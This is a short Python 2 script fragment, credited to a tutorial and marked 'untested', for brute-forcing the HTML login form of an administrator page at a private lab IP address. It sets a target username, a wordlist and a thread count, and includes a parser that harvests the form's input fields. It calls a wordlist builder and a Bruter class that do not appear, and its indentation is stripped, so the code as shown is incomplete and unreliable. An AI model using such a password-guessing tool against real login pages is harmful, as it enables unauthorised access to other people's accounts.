#credits :https://codingsec.net/2016/05/brute-forcing-html-form-authentication-using-python/ 
#untested 
import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
# general settings
user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None
# target specific settings
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"
username_field= "username"
password_field= "passwd"
success_check = "Administration - Control Panel"

class BruteParser(HTMLParser):
def __init__(self):
HTMLParser.__init__(self)
self.tag_results = {}
def handle_starttag(self, tag, attrs):
if tag == "input":
tag_name = None
tag_value = None
for name,value in attrs:
if name == "name":
tag_name = value
if name == "value":
tag_value = value
if tag_name is not None:
self.tag_results[tag_name] = value

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
